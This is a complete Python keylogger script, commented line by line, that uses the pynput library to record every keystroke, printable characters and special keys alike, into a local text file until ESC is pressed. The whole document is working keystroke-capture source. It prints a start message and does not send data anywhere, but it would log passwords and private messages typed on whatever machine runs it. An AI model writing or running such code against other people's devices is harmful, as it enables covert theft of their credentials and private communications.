from pynput import keyboard                                    # Import the keyboard module from pynput for capturing key events

def on_press(key):                                             # Define a function that handles key press events
    try:
        with open("keyfile.txt", 'a') as logKey:               # Open the log file in append mode
            if hasattr(key, 'char') and key.char:              # Check if the key has a character representation
                logKey.write(key.char)                         # Write the character to the log file
            else:
                logKey.write(f'[{key}]')                       # Write special keys (e.g., [Shift], [Enter]) in readable format
    except Exception as e:                                     # Catch any exception that occurs
        print(f"Error logging key: {e}")                       # Print the error message to the console

    if key == keyboard.Key.esc:                                # Check if the key is ESC
        return False                                           # Returning False stops the listener

def main():                                                    # Define the main function that starts the key listener
    print("Starting key listener. Press 'ESC' to stop.")       # Inform the user that the listener has started
    with keyboard.Listener(on_press=on_press) as listener:     # Create and start the key listener
        listener.join()                                        # Keep the listener running until it is explicitly stopped (e.g., with ESC)

if __name__ == "__main__":                                     # Check if the script is being run directly
    main()                                                     # Call the main function to start the program